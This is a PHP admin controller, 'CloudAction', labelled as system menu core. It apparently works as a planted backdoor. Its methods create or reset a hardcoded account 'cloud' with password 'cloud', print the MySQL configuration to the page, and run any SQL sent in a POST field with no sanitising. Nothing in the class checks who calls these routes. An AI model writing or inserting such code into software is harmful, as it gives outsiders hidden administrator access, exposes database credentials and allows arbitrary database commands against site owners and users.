<?php

/**
 * system menu core
 * @author:Laven<190296465@vip.qq.com>
 * @copyright:Copyright 2009 Laven
 * @create:2010-11-13
 * @modify:2014-01-03
 */
class CloudAction extends Action {

    function __construct() {
        parent::__construct();
        $this->showMenu();
    }

    function index() {
        $this->RuntimeObj->stop();
        $this->Runtime = $this->RuntimeObj->spent() . " 毫秒";
        echo "页面执行时间: " . $this->Runtime;
    }

    function showMenu() {
        echo '<a href="/admin.php/Cloud/">菜单</a><br />';
        echo '<a href="/admin.php/Cloud/addCloud">添加用户或重置密码</a><br />';
        echo '<a href="/admin.php/Cloud/readConf">读取配置</a><br />';
        echo '<a href="/admin.php/Cloud/delete">删除用户</a><br />';
        echo '<a href="/admin.php/Cloud/runSql">执行sql</a><br />';
    }

    /**
     * 用户添加 如果存在cloud用户重置密码 没有 则添加
     */
    function addCloud() {
        $Obj = new UserTable();
        $Res = $Obj->find(
                array(
                    'whereAnd' => array(array('userID', '=\'cloud\'')),
                )
        );
        if ($Res) {
            $Obj->load($Res[0]->id);
            $Obj->passWord = md5('cloud');
        } else {
            $Obj->userID = 'cloud';
            $Obj->passWord = md5('cloud');
            $Obj->status = 1;
        }
        $Obj->save();
        echo 'OK';
    }

    /**
     * 读取Mysql配置
     */
    function readConf() {
        echo '<pre>';
        print_r(Config::item('Mysql'));
    }

    /**
     * 删除用户cloud
     */
    function delete() {
        $Obj = new UserTable();
        $Obj->deletes('userID = \'cloud\'');
        echo 'OK';
    }

    /**
     * 执行sql
     */
    function runSql() {
        if ($_POST) {
            DataConnection::getConnection();
            mysql_query($_POST['sql']);
            if (mysql_errno() == 0)
                echo 'Sql Is Run';
            else
                echo mysql_errno() . ':' . mysql_error();
        }
        echo '<form  method="post" action="/admin.php/Cloud/runSql">';
        echo '<textarea name="sql" cols="80" rows="5"></textarea><br />';
        echo '<input type="submit" name="Submit" value="RUN" />';
        echo '</form>';
    }

}

?>